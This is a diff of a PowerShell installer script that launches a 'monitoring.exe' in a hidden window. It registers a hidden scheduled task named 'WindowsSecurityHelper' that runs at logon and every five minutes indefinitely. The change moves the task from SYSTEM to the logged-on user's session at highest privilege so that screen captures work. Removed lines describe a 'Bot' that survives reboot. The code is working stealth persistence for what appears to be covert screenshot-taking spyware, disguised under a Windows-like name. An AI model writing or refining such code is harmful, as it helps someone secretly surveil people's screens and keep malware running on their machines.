@@ -102,21 +102,21 @@ Log "Created uninstall BATs in folder and %TEMP%"
 Start-Process -FilePath $ExePath -WindowStyle Hidden
 Log "Started monitoring.exe hiddenly"
 
-# === ADDED STARTUP TASK SCHEDULER CODE FROM secfnx.ps11 ===
+# === FIXED TASK SCHEDULER CODE - WORKS WITH SCREENSHOTS ===
 $TaskName = "WindowsSecurityHelper"
-
-# --- Create Scheduled Task (NO XML DURATION ERROR) ---
+# Use currently logged-on user instead of SYSTEM
+$User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$Principal = New-ScheduledTaskPrincipal -UserId $User -LogonType Interactive -RunLevel Highest
 $Action = New-ScheduledTaskAction -Execute $ExePath
 # Trigger 1: At logon
 $Trigger1 = New-ScheduledTaskTrigger -AtLogOn
-# Trigger 2: Repeat every 5 minutes forever (starts in 1 minute)
+# Trigger 2: Every 5 minutes (starts in 1 minute)
 $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
 $Trigger2.RepetitionInterval = New-TimeSpan -Minutes 5
-$Trigger2.RepetitionDuration = New-TimeSpan -Days 10675199 # ≈ 29,000 years = "infinite"
-# Settings: Hidden
-$Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)
-# Run as SYSTEM
-$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$Trigger2.RepetitionDuration = New-TimeSpan -Days 10675199
+# IMPORTANT: Run whether user is logged on or not = OFF
+# Run only when user is logged on = ON (so it has desktop access)
+$Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0) -RunOnlyIfIdle $false -DisallowStartIfOnBatteries $false
 try {
     Unregister-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue -Confirm:$false
     Register-ScheduledTask -TaskName $TaskName `
@@ -125,12 +125,8 @@ try {
                            -Settings $Settings `
                            -Principal $Principal `
                            -Force | Out-Null
-    Log "SUCCESS: Task created - runs on boot + every 5 mins"
+    Log "SUCCESS: Task created (runs in user session - screenshots WILL work)"
 } catch {
     Log "ERROR: Task creation failed - $_"
 }
-# --- Run now (in case it wasn't started yet) ---
-Start-Process -FilePath $ExePath -WindowStyle Hidden
-Log "Started monitoring.exe"
-Log "Installation complete. Bot will survive reboot."
-# === END OF ADDED CODE ===
+# === END OF FIXED BLOCK ===
